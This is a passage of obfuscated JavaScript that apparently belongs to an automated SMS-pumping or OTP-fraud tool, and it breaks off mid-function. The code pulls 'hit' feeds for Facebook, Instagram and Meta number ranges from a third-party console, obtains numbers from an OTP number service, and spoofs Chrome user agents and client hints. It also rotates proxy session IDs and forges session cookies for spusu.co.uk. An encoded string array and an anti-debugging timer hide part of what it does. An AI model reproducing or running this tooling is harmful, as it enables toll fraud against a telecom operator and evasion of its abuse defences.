'cIaG4PYxieHxsuqGAw50zwDYAxr5ignOzwnRigzHAwXLzc4GvgfTCgvYAw5NigrLDgvJDgvKlGO', 'BgjYwuG', 'cIaG4PYxifvWzgf0zsbYzxf1AxjLzceGugXLyxnLigrVD25SB2fKihrOzsbSyxrLC3qGDMvYC2LVBI4k', 'C3rYAw5N', 'Aw52ywXPzgf0zq', 'cIaG4PYxie5VihzHBgLKihjHBMDLCY4k', 'BKn0r0O', 'CgfZCW', 'BMfTzq', 'AgvHzgvYCW', 'BM93', 'twf4ihbYAwnLihbLCIbUDw1IzxiGw2rLzMf1Bhq6idaUnv06', 'BwLU', 'iokUNIa', '8j+tPIbbBgW', 'DhDVt29dB25MAwC', 'A01Yzgq', 'D3jPDgvgAwXLu3LUyW', 'wMvUzxG6ieLUC3vMzMLJAwvUDcbIywXHBMnL', 'zK1yBxm', 'zgr6vK4', 'Dgn1s3u', 'EeX5zMC', 'Ahr0Chm6lY93D3CUC3b1C3uUy28UDwSVBg9NAw4', 'C3rLEf9RzxKUDhH0', 'thnPu3O', 'D2P2rem', 'cIaG4PYxieXPy2vUC2uGDMvYAwzPy2f0Aw9UignVBM5Ly3rPB24GzxjYB3i6ia', 'y29Kzq', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'AxnbCNjHEq', 'zw5K', 'AKnkChe', 'C2vJlwzLDgnOlw1Vzgu', 'zgvSyxLnCW', 'q0zKAKC', 'icdILze', 'BNnTqu0', 'C21ZyM93zxi', 'ALPoCwm', 'uMfUz2uGrMLUzgvYig1Vzgu6', 'qKDcqvu', 'BgH4wLu', 'zw5KC1DPDgG', 'Bwv0Ag9K', 'y3b1CW', 'cIaGrw50zxiGC2vSzwn0Aw9UicHLlMCUideSmYb8ideGmIa1ihWGms0ZkqO', 'yKT6y04', 'u01tiejVD2vYigTLEsbMB3vUzcaO', 'vNPju3O', 'tMv4yu9uudOGsw52ywXPzcbYzxnWB25Zzq', 'twzfDKu', 'C0r6uwK', 'DxbKyxrLx3jLCxvPCMvK', 'rgvZA3rVCa', 'AhDPza', 'EwvZ', 'CMvWzwf0', 'BgvUz3rO', 'DgLTzxn0yw1W', 'icdILiiGia', 'DuPqqLa', 'A3HlDK8', 'tg9Mtgy', 'drTBsW', 'q29UDgvUDc1mzw5NDgG', 'lI4Ukq', 'u2vJluzLDgnOlu1Vzgu', 'CgHVBMu', 'ChjVy2vZC2LUzW', 'Ahr0CdOVlW', 'zMLSzq', 'wLzXtLa', 'mc41', 'y2HHz00', 'rw50zxiGu01tiejVD2vYiefqssblzxK6', '4PQHief1Dg8Gzgv0zwn0icyGC2vUzcaOiZeGCMfUz2uP', 'u2vSzwn0ihjHBMDLCZO', 'zMXVB3i', 'iefqssaO', 'zMfJzwjVB2S', 'zK5uDw8', 'u2vJluzLDgnOlvvZzxi', 'iK5VDd9bx0jYyw5KiJT2psi5osi', 'C3rKAw8', 'BLrNuMm', 'Aw5OzxjPDa', 'Eu9ezKm', 'q29Uy3vYCMvUy3KGlYbuAhjLywqGy291BNqGw2rLzMf1Bhq6idvDoG', 'igHPDhmPica', 'C3vIC3rYAw5N', 'iK5VDcLbo0jYyw5KiJT2psi5osi', 'cIaGw1jHBMDLiezPBMrLCL0GrMv0y2HPBMCGBgL2zsbJB25ZB2XLigzLzwqUlI4', '4PYtifrOCMvHzhmGoIa', 'yMfZzty0', 'C29JA3m0oI8V', 'rw50zxiGDgfYz2v0ihbOB25Lig51BwjLCIaOzs5NlIaRndq3nZGXnte5mtaWktO', 'yxbWx2LK', 'rhbQuhi', 'CNfOvKW', 'EMXPyG', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'tgLxsve', 'EMvUzxHFA2v5lNr4Da', 'jMnVDw50CNK9', 'u21ZqM93zxiGBMv0oIa', 'qwrKzwqG', 'Au95tvu', 'q29UC29SzsbUzxr3B3jRoIa', 'zg9JDw1LBNq', 'ls0Tls1cruDjtIbqvujmsumGs0vzls0Tls0ktunVD0jrwurlmLz3qxLfquLvn1bJnZvHBYTgBJDyr0m3A0zhzurOn0PbCZnVne5ttdjmz21omfLTzLK9cI0Tls0Tru5eifbvqKXjqYblrvKTls0Tlq', 'v29YA2vYia', 'rMLSDgvYigj5igfWCdO', 'qwnJzxb0luXHBMD1ywDL', 't25LrhjPDMu', 'EKLdr1e', 'Bwf4uhjPy2u', 'q2rYALe', 'wvrVzxu', 'C2vJlwzLDgnOlwrLC3q', 'yxzOt2y', 'zvLxD20', 'sw5ZDwzMAwnPzw50igjHBgfUy2u', 'BwvZC2fNzq', 'EMvUzxG', 'u3rHDhvZia', 'Dw5SAw5Ru3LUyW', 'u01tiejVD2vYoIbjBNzHBgLKiefqssbRzxK', 'qNDysKW', 'vxbNCMfKzs1jBNnLy3vYzs1szxf1zxn0CW', 'ruvKvMi', 'lxnZAwqT', 'Cg9W', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'zfzNu2C', 'uuX0zeK', 'u01tiejVD2vYoIbjBNn1zMzPy2LLBNqGyMfSyw5Jzq', 'teXIweC', '4PYp77Ipien1C3rVBsbqCM94EsbgAwXL', 'zNvUy3rPB24GkLWOicPCkq', 'z3jHEq', 'A21fsxO', 'C2vJlwnOlxvHlw1VyMLSzq', 'wwvZlcb1C2uGC2f2zwqGA2v5', 'DgLTzw91Da', 'cIaG4PYxieLUDgvYBMfSifnLCNzLCIbfCNjVCIaOntaWks4GugXLyxnLihrYEsbHz2fPBIbSyxrLCI4k', 'Ahr0ChmTChjVEhKTywDLBNq', 'qwLjAMu', 'AM9PBG', 'y2HPBgrFChjVy2vZCW', 'iIWG', 'DxbIz1a', 'r0vu', 'ChjVEgLLC0zPBgu', 'l3n0B3jHz2uVzw11Bgf0zwqVmc9ty3jHCgvYieTPBMCVC3b1C3u', 'Aw5ZDgfNCMfT', 'EMLvqKO', 'sejUwxC', 'BNvSBa', 'icbB', 'DxnLq291BNq', 'Ahr0Chm6lY93D3CUC3b1C3uUy28UDwSVAw1VC2nTC2fWAs9HDxrOzw50AwnHDgLVBI9VBMv0Aw1Ly29Kzs9ZBxm6z2vUzxjHDgu', 'l3n0B3jHz2uVzw11Bgf0zwqVma', 'qvzYExy', 'Bg9N', 'qxfZsKK', 'Aw5ZDwzMAwnPzw50', 'EefKDvK', 'EKLkzgm', 'C2v0vgLTzw91Da', 'u3b1C3uGvuSGt1rqifrYAwDNzxiGicaGicaGica', 'C2HHmJu2', 'tM8GBNvTyMvYCYbHDMfPBgfIBgu', 'zg93BG', 'vMrbD1q', 'icdILzeGifn0yxr1CYa6ia', 'rvfdCey', 'cIaG4PYxienVBNnVBguGzMv0y2GGzMfPBgvKoIa', 'q29UBMvJDgLVBG', 'yxbWBgLJyxrPB24VANnVBG', 'CgLWzq', 'wLrzsve', 'DNvzzhK', 'wMr2yMm', 'shDZAu4', 'zMfPBgvK', 'DuTQDMS', 'CMfUz2vZ', 'zhvsyMO', 'CMv0DxjUicHMDw5JDgLVBIGPia', '4Psm4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psq', 'mhW5Fdf8m3W0FdeXFdeZFdH8mNWXmhW3FdeYFdz8nq', 'rw50zxiGtNvTyMvYCYbgAwXLifbHDgG6', 'FhnWDxn1FdeUmc4WFa', 'icdILzeGicaG4PYxifvoqvvuse9ssvPfrcbiqvjev0fsrsdIGjqGu1bvu1uGve9ptcaGicaGiokvKq', 'C0jzswS', 'cIaG4PYxiezPBguGBM90igzVDw5KoIa', 'C21hq2i', 'cIaG4PYxieLUDMfSAwqGu2vYDMvYifjLC3bVBNnLoIbnAxnZAw5NifnLC3nPB24Gvg9Rzw4UiefIB3j0Aw5NlGO', 'mM9VosbUzxr3B3jRoIa', 'tMHKBe4', 'ELrHAKy', 'iK5VDcbbkejYyw5KiJT2psi4iG', '4PYp77IpicbfBNrLCIbTyw51ywXSEq', 'C3rKB3v0', 'DKTMs0G', 'CMLK', 'wwHyBMm', 'oYbZDgf5t25uAgLZu2L0zt10CNvLoYbHy2nLChrtChvZDunVB2TPzxm9BMvJzxnZyxj5', 'w0vsuK9sxsbUCg0GAw5ZDgfSBcbMywLSzwq', 'C3rHCNruAw1L', 'vMvYAwz5Aw5NieXPy2vUC2uUlI4GicaGicaGica', 'yunbseK', 'vKTcEwO', 'DM9SDhHFA2v5lNr4Da', 'rgnAvgq', 'cIaG4PYtief1Dg8GuMfUz2u6ia', 'cIaG4PYxienVDwXKig5VDcbNzw5LCMf0zsbiyxjKD2fYzsbjrc4GuNvUig9UifDPBMrVD3mUcG', 'uhjbEha', 'C2HPzNq', 'tMTMuvC', 'DuPsuwm', '8j+tMcbgywnLyM9VAW', 'z0LWBNq', 'C3rVCa', 'g1SYsHTBsa', 'vg90ywWGvgLTzq', '4Psu4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4PsycG', 'cIaG4PYxie5VigHPDhmGzM9YihnLBgvJDgvKigfWCc4k', 'mtG4lJeZnY4XnZyUmtyZ', 'zM9YBwf0', 'wMvUzxGGDgLTzw91Da', 'ywrK', 'jg1Nid0GkeDLDc1jDgvTuhjVCgvYDhKGj0Hlte06xfnprLrxqvjfxe1Py3jVC29MDfXdCNLWDg9NCMfWAhKNic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLks5nywnOAw5Lr3vPzdSG', 'DhLWzq', 'DgHLBG', 'Bw9KzwW', 'Be1cDKe', 'ywn0AxzHDgLVBKLK', 'Dg90ywXdB3vUDa', 'CMvTB3zL', 'ChvLwMC', 'werzrwi', 'CgfKu3rHCNq', 'qwnJzxb0luvUy29KAw5N', 'sLvvsue', 'C21ZyM93zxiUCgfNzq', 'C29JA3m1', 'zw5XDwv1zq', 'ig51BwjLCNmP', '4PQHifPLBMv4icHbDxrViezLzwqP', 'BM9FCgX1C19UDw1Izxi', 'rgvSzxrLihnHDMvKigTLEq', 'B3v0Chv0', 'C2v0lwnVB2TPzq', 'u0vmrunuifbst1HzienptKzjr1vsqvrjt04', 'C3bSAxq', 'icb8x19FxY98ic5FxY8Gxf9Flf98x19Fl1XFxYXFFcaGicaGicaGicaG', 'u3rLEcdWN5sL', 'ze5lvee', 'C2v0uMf3tw9Kzq', 'wwnKCNK', 'C3rHDgvpyMPLy3q', 'tefpvKG', 'Dc5Tzs9Zy3jHCgvYx2TPBMCGicaGicaGicaGica', 'v3jPDguTt3v0Chv0icGOjg1NlcrJChuSjgrPC2SSjg1IksaTAM9PBIaNFcCPiG', 'BLjdq2W', 'zM9LCK8', 'u1zLC3K', 'icaGicaGicb8x3WGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaGcG', 'EKrJwwG', 'C09jvgS', 'iK5VDcLbpujYyw5KiJT2psi4iG', '8j+tGsbuyxjNzxqGtNvTyMvYCYbMCM9TiezPBgu', 'DhjPz2DLCK9uua', 'y29VA2LL', 'q29UC29Szsb0Aw1LB3v0', 'iM1Hy09tiG', 't29su1q', 'iZDcmKzgrG', 'i0zgndq2nG', 'AMjvvw8', 'reLOq0m', 'qvzfvvK', 'ChjVEgLLCY50Ehq', 'sgzWy0O', 'CM91BMq', 'qundrvntx05vtujfuJO', 'ufnMyNm', 'vM9SDhGG4PQH', 'jM1HEfbYAwnLpq', 'DwTKyMG', 'C2v0DgLUz3mGz2v0ihnLy3vYzsbHBMrYB2LKx2LKidi+l2rLDI9UDwXSihX8igvJAg8GiIi', 'BNvTyMvY', 'CK1Urvq', 'CMvZB2X2zq', 'l2v0yY9TywnOAw5LlwLK', '8j+tIIbtAg93ihrVCca1icyGC2vSzwn0', 'Dg90ywXTzw0', 'CenVCeC', 'v3PequG', 'BNvTu291CMnL', 'tg5Hrgi', 't2HRteu', 'wMvUzxGGBMv0oIa', 'rw50zxiGCMfUz2uGiW', 'CuDrALe', 'BNHqwvy', 'zxHPDa', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'y2f0y2G', 'yxbPs2v5', 'yxv0BW', 'CgPHCgW', 'oYbdtvnmB2nHBgu9zw4Tr0i7ig1YC3jVDxrLpq', 'ywn0Aw9U', '4PscifVIGkjDifLVDxiGsfDjrca6ia', 'C3rHDhvZq29Kzq', 'z0rcq3O', 'vK1wtge', 'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'vKPAEhm', 'wMvUzxG6ie5Vig51BwjLCNmGyxzHAwXHyMXLigzVCIbYyw5Nzsa', 'uMv0CNKG', 'Cw1msvy', 'Bwf4', 'CMvSzwfZzq', 'sezxD2i', 'EMX2t1u', 'icHLlMCUidq0n1HywfHywfHyksbVCIaNyMfJAYC6', 'Bwf4vxnLCW', 'mdaWmdaWmdaWmdaWmdaWma', 'vxnLCI1bz2vUDa'];
  fn1 = function () {
    return v91;
  };
  return fn1();
}
function twoOoFetchConsole(v92, v93) {
  return new Promise((v94, v95) => {
    const v96 = {};
    v96.mauthapi = v92;
    const v97 = {};
    v97.hostname = "api.2oo9.cloud";
    v97.port = 0x1bb, v97.path = v93, v97.method = "GET", v97.headers = v96;
    const v98 = v97,
      v99 = https.request(v98, v100 => {
        let v101 = '';
        v100.on("data", v102 => v101 += v102), v100.on("end", () => {
          try {
            const v103 = JSON.parse(v101);
            if (v103?.["meta"]?.["code"] === 0xc8 && Array.isArray(v103?.["data"]?.["hits"])) v94(v103.data.hits);else v95(new Error(v103?.["message"] || "Console fetch failed"));
          } catch (v104) {
            v95(new Error("Console: Invalid JSON"));
          }
        });
      });
    v99.on("error", v105 => v95(new Error("Console network: " + v105.message)));
    v99.setTimeout(0x2710, () => {
      v99.destroy();
      v95(new Error("Console timeout"));
    }), v99.end();
  });
}
function parseTwoOoRangeSelection(v106, v107) {
  const v108 = new Set(),
    v109 = v106.split(/[\s,]+/).filter(v110 => v110);
  for (const v111 of v109) {
    const v112 = v111.match(/^(\d+)-(\d+)$/);
    if (v112) for (let v113 = +v112[0x1]; v113 <= +v112[0x2]; v113++) {
      if (v113 >= 0x1 && v113 <= v107) v108.add(v113 - 0x1);
    } else {
      const v114 = parseInt(v111);
      if (!isNaN(v114) && v114 >= 0x1 && v114 <= v107) v108.add(v114 - 0x1);
    }
  }
  return [...v108].sort((v115, v116) => v115 - v116);
}
async function autoRangeFinderFor2Oo(v117, v118, v119, v120) {
  const v121 = {};
  v121.facebook = ["facebook", 'fb'], v121.instagram = ["instagram", 'ig'], v121.meta = ["meta"], v121.all = ["facebook", 'fb', "instagram", 'ig', "meta", "spusu"];
  const v122 = v121,
    v123 = {};
  v123.facebook = "📘 Facebook", v123.instagram = "📸 Instagram", v123.meta = "🌐 Meta", v123.all = "📦 All";
  const v124 = v123;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v125 = [];
  try {
    v125 = await twoOoFetchConsole(v117, v118);
  } catch (v138) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v138.message + '\x0a')), null;
  }
  const v126 = v125.slice(0x0, 0x64);
  if (v126.length === 0x0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v127 = {};
  v127.name = "📘 Facebook", v127.value = "facebook";
  const v128 = {};
  v128.name = "📦 All", v128.value = "all";
  const v129 = await v119("Filter by app:", [v127, {
      'name': "📸 Instagram",
      'value': "instagram"
    }, {
      'name': "🌐 Meta",
      'value': "meta"
    }, v128]),
    v130 = v122[v129],
    v131 = v126.filter(v139 => {
      const v140 = (v139.sid || '').toLowerCase(),
        v141 = (v139.message || '').toLowerCase();
      return v130.some(v142 => v140.includes(v142) || v141.includes(v142));
    });
  if (v131.length === 0x0) return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  const v132 = {},
    v133 = {};
  for (const v143 of v131) {
    const v144 = v143.range || '';
    if (!v144) continue;
    v132[v144] = (v132[v144] || 0x0) + 0x1;
    const v145 = {};
    v145.facebook = 0x0, v145.instagram = 0x0, v145.meta = 0x0, v133[v144] = v133[v144] || v145;
    if (v122.facebook.some(v146 => (v143.sid || '').toLowerCase().includes(v146) || (v143.message || '').toLowerCase().includes(v146))) v133[v144].facebook++;
    if (v122.instagram.some(v147 => (v143.sid || '').toLowerCase().includes(v147) || (v143.message || '').toLowerCase().includes(v147))) v133[v144].instagram++;
    if (v122.meta.some(v148 => (v143.sid || '').toLowerCase().includes(v148) || (v143.message || '').toLowerCase().includes(v148))) v133[v144].meta++;
  }
  const v134 = Object.entries(v132).sort((v149, v150) => v150[0x1] - v149[0x1]).slice(0x0, 0x5);
  if (v134.length === 0x0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v135 = {};
  v135.name = "⚡ Auto detect & send (#1 range)", v135.value = "auto";
  const v136 = {};
  v136.name = "📊 Show top 5 & select", v136.value = "select";
  const v137 = await v119("Range Finder mode:", [v135, v136]);
  if (v137 === "auto") {
    const [v151, v152] = v134[0x0],
      v153 = v133[v151] || {},
      v154 = [];
    if (v153.facebook) v154.push("📘FB(" + v153.facebook + ')');
    if (v153.instagram) v154.push("📸IG(" + v153.instagram + ')');
    if (v153.meta) v154.push("🌐Meta(" + v153.meta + ')');
    return console.log(chalk.green("\n  ✓ Auto Range: " + v151 + "  (" + v152 + " hits)  " + v154.join('\x20') + '\x0a')), [v151];
  } else {
    console.log(chalk.cyan("\n  App: " + v124[v129] + "  |  Scanned: " + v131.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(0x16))), v134.forEach(([v158, v159], v160) => {
      const v161 = v133[v158] || {},
        v162 = [];
      if (v161.facebook) v162.push("📘FB(" + v161.facebook + ')');
      if (v161.instagram) v162.push("📸IG(" + v161.instagram + ')');
      if (v161.meta) v162.push("🌐Meta(" + v161.meta + ')');
      console.log(chalk.cyan('\x20\x20' + String(v160 + 0x1).padEnd(0x3) + '\x20') + chalk.green(v158.padEnd(0x10)) + chalk.yellow(String(v159).padEnd(0x5)) + chalk.gray('█'.repeat(Math.min(v159, 0xc)) + '\x20\x20') + (v162.join('\x20') || chalk.gray('?')));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v155 = await v120("Select ranges:", ''),
      v156 = parseTwoOoRangeSelection(v155, v134.length);
    if (v156.length === 0x0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    const v157 = v156.map(v163 => v134[v163][0x0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v157.join(',\x20') + '\x0a')), v157;
  }
}
const NEXA_KEY_FILE = path.join(__dirname, "nexa_key.txt");
function nexaFetchNumber(v164, v165, v166) {
  return new Promise((v167, v168) => {
    const v169 = {};
    v169.range = v165, v169.format = "normal";
    const v170 = JSON.stringify(v169),
      v171 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v166 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v164,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v170)
        }
      },
      v172 = http.request(v171, v173 => {
        let v174 = '';
        v173.on("data", v175 => v174 += v175), v173.on("end", () => {
          try {
            const v176 = JSON.parse(v174);
            v176.success && v176.number ? v167(v176.number.replace(/[^0-9]/g, '')) : v168(new Error(v176.error || "NexaOTP: No number returned"));
          } catch (v177) {
            v168(new Error("NexaOTP: Invalid response"));
          }
        });
      });
    v172.on("error", v178 => v168(new Error("NexaOTP network: " + v178.message))), v172.setTimeout(0x2710, () => {
      v172.destroy(), v168(new Error("NexaOTP: Timeout"));
    }), v172.write(v170), v172.end();
  });
}
const v1 = {};
v1.v = 0x82, v1.grease = "\"Not?A_Brand\";v=\"99\"";
const v2 = {};
v2.v = 0x83, v2.grease = "\"Not_A Brand\";v=\"24\"";
const v3 = {};
v3.v = 0x84, v3.grease = "\"Not A(Brand\";v=\"8\"";
const v4 = {};
v4.v = 0x85, v4.grease = "\"Not(A;Brand\";v=\"99\"";
const v5 = {};
v5.v = 0x86, v5.grease = "\"Not;A)Brand\";v=\"24\"";
const v6 = {};
v6.v = 0x87, v6.grease = "\"Not)A=Brand\";v=\"8\"";
const v7 = {};
v7.v = 0x88, v7.grease = "\"Not=A_Brand\";v=\"99\"";
const v8 = {};
v8.v = 0x89, v8.grease = "\"Not/A)Brand\";v=\"8\"";
const v9 = {};
v9.v = 0x8a, v9.grease = "\"Not)A;Brand\";v=\"99\"";
const v10 = {};
v10.v = 0x8b, v10.grease = "\"Not;A=Brand\";v=\"24\"";
const v11 = {};
v11.v = 0x8c, v11.grease = "\"Not=A?Brand\";v=\"8\"";
const v12 = {};
v12.v = 0x8d;
v12.grease = "\"Not?A_Brand\";v=\"24\"";
const v13 = {};
v13.v = 0x8e, v13.grease = "\"Not_A Brand\";v=\"8\"";
const v14 = {};
v14.v = 0x99, v14.grease = "\"Not_A Brand\";v=\"8\"";
const CHROME_CLIENTS = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14];
function getRandomClient() {
  const v179 = CHROME_CLIENTS[Math.floor(Math.random() * CHROME_CLIENTS.length)],
    v180 = v179.v,
    v181 = Math.random() < 0.15;
  let v182, v183;
  v181 ? (v182 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v180 + ".0.0.0 Safari/537.36", v183 = "\"macOS\"") : (v182 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v180 + ".0.0.0 Safari/537.36", v183 = "\"Windows\"");
  const v184 = "\"Google Chrome\";v=\"" + v180 + "\", " + v179.grease + ", \"Chromium\";v=\"" + v180 + '\x22',
    v185 = {};
  v185.ua = v182;
  v185.cv = v180, v185.platform = v183, v185.secChUa = v184;
  return v185;
}
function parseProxy(v186) {
  if (!v186) return null;
  if (typeof v186 === "object") return v186;
  v186 = v186.trim();
  if (!v186) return null;
  let v187 = "http";
  (v186.toLowerCase().startsWith("socks5://") || v186.toLowerCase().startsWith("socks4://")) && (v187 = v186.split("://")[0x0].toLowerCase());
  if (v186.includes("://")) v186 = v186.split("://")[0x1];
  let v188, v189, v190, v191;
  if (v186.includes('@')) {
    const v193 = v186.split('@'),
      v194 = v193[0x0].split(':'),
      v195 = v193[0x1].split(':');
    v190 = v194[0x0], v191 = v194[0x1], v188 = v195[0x0], v189 = parseInt(v195[0x1]);
  } else {
    const v196 = v186.split(':');
    if (v196.length === 0x2) v188 = v196[0x0], v189 = parseInt(v196[0x1]);else {
      if (v196.length === 0x4) !isNaN(parseInt(v196[0x3])) && isNaN(parseInt(v196[0x1])) ? (v190 = v196[0x0], v191 = v196[0x1], v188 = v196[0x2], v189 = parseInt(v196[0x3])) : (v188 = v196[0x0], v189 = parseInt(v196[0x1]), v190 = v196[0x2], v191 = v196[0x3]);else v196.length === 0x3 && (v188 = v196[0x0], v189 = parseInt(v196[0x1]), v190 = v196[0x2]);
    }
  }
  if (!v188 || !v189) return null;
  const v192 = {};
  v192.type = v187, v192.host = v188;
  v192.port = v189;
  return v192.user = v190, v192.pass = v191, v192;
}
(function () {
  let v197;
  try {
    const v198 = Function('return (function() {}.constructor("return this")( ));');
    v197 = v198();
  } catch (v199) {
    v197 = window;
  }
  v197.setInterval(fn2, 0xdac);
})();
function rotateSessionId(v200) {
  if (!v200 || !v200.user) return v200;
  const v201 = {
      ...v200
    },
    v202 = v201,
    v203 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').slice(0x0, 0xa);
  if (v202.user.includes("-ssid-")) v202.user = v202.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v203);else {
    if (v202.user.includes("-session-")) v202.user = v202.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v203);else {
      if (/_sid_/i.test(v202.user)) v202.user = v202.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v203);
    }
  }
  return v202;
}
function mkAgent(v204) {
  if (!v204) return null;
  if (v204.type === "socks5" || v204.type === "socks4") {
    const v206 = v204.user ? encodeURIComponent(v204.user) + ':' + encodeURIComponent(v204.pass || '') + '@' : '';
    return new SocksProxyAgent("socks5://" + v206 + v204.host + ':' + v204.port);
  }
  const v205 = v204.user ? encodeURIComponent(v204.user) + ':' + encodeURIComponent(v204.pass || '') + '@' : '';
  return new HttpsProxyAgent("http://" + v205 + v204.host + ':' + v204.port);
}
function sendRequest(v207, v208, v209, v210, v211, v212) {
  v212 = v212 || 0x7530;
  return new Promise((v213, v214) => {
    const v215 = new URL(v207);
    const v216 = {
        ...v209
      },
      v217 = v216;
    if (!v217["Accept-Encoding"]) v217["Accept-Encoding"] = "gzip, deflate, br, zstd";
    if (v210) v217["Content-Length"] = Buffer.byteLength(v210);
    const v218 = {
      'hostname': v215.hostname,
      'path': v215.pathname + v215.search,
      'method': v208,
      'headers': v217,
      'timeout': v212
    };
    if (v211) {
      if (isNaN(v211.port) || v211.port <= 0x0) return v214(new Error("Invalid proxy"));
      v218.agent = mkAgent(v211);
    }
    const v219 = https.request(v218, v220 => {
      const v221 = [];
      v220.on("data", v222 => v221.push(v222));
      v220.on("error", v214);
      v220.on("end", () => {
        let v223 = Buffer.concat(v221);
        const v224 = v220.headers["content-encoding"];
        if (v224 === "gzip") try {
          v223 = zlib.gunzipSync(v223);
        } catch (v225) {} else {
          if (v224 === "deflate") try {
            v223 = zlib.inflateSync(v223);
          } catch (v226) {} else {
            if (v224 === 'br') try {
              v223 = zlib.brotliDecompressSync(v223);
            } catch (v227) {}
          }
        }
        v213({
          'status': v220.statusCode,
          'data': v223.toString("utf8"),
          'headers': v220.headers
        });
      });
    });
    v219.on("error", v214), v219.on("timeout", () => {
      v219.destroy();
      v214(new Error("timeout"));
    });
    if (v210) v219.write(v210);
    v219.end();
  });
}
class SessionManager {
  constructor() {
    this.currentSession = null, this.useCount = 0x0;
    this.maxUses = 0x14;
    this.lock = Promise.resolve();
  }
  async ["getCookieString"](v228) {
    if (this.currentSession && this.useCount < this.maxUses) return this.useCount++, this.currentSession;
    return await this.refreshSession(v228);
  }
  async ["refreshSession"](v229) {
    return this.lock = this.lock.then(async () => {
      if (this.currentSession && this.useCount < this.maxUses) return this.useCount++, this.currentSession;
      try {
        const v230 = getRandomClient(),
          v231 = {};
        v231.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", v231["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8", v231["User-Agent"] = v230.ua, v231["Sec-Ch-Ua"] = v230.secChUa, v231["Sec-Ch-Ua-Mobile"] = '?0', v231["Sec-Ch-Ua-Platform"] = v230.platform, v231["Sec-Fetch-Dest"] = "document", v231["Sec-Fetch-Mode"] = "navigate", v231["Sec-Fetch-Site"] = "none", v231["Sec-Fetch-User"] = '?1', v231["Upgrade-Insecure-Requests"] = '1';
        const v232 = v231,
          v233 = await sendRequest("https://www.spusu.co.uk/login", "GET", v232, null, v229, 0x3a98);
        let v234 = null,
          v235 = "SERVER2";
        if (v233.headers && v233.headers["set-cookie"]) {
          const v236 = Array.isArray(v233.headers["set-cookie"]) ? v233.headers["set-cookie"] : [v233.headers["set-cookie"]];
          for (const v237 of v236) {
            const v238 = v237.match(/SESSIONID=([^;]+)/i);
            if (v238) v234 = v238[0x1];
            const v239 = v237.match(/mrsroute=([^;]+)/i);
            if (v239) v235 = v239[0x1];
          }
        }
        return !v234 && (v234 = crypto.randomBytes(0x10).toString("hex")), this.currentSession = "SESSIONID=" + v234 + "; CMSLocale=en-GB; mrsroute=" + v235 + "; stayOnThisSite=true; acceptSpusuCookies=necessary", this.useCount = 0x1, this.currentSession;
      } catch (v240) {
        const v241 = crypto.randomBytes(0x10).toString("hex");
        return this.currentSession = "SESSIONID=" + v241 + "; CMSLocale=en-GB; mrsroute=SERVER2; stayOnThisSite=true; acceptSpusuCookies=necessary", this.useCount = 0x1, this.currentSession;
      }
    });
  }
  ["invalidate"]() {
    this.currentSession = null, this.useCount = 0x0;
  }
}
const globalSessionManager = new SessionManager();
function formatPhone(v242) {
  let v243 = String(v242 || '').trim();
  if (v243.includes(':')) {
    const v244 = v243.split(':');
    v243 = v244[v244.length - 0x1].trim();
  }
  v243 = v243.replace(/[^0-9+]/g, '');
  if (!v243.startsWith('+')) {
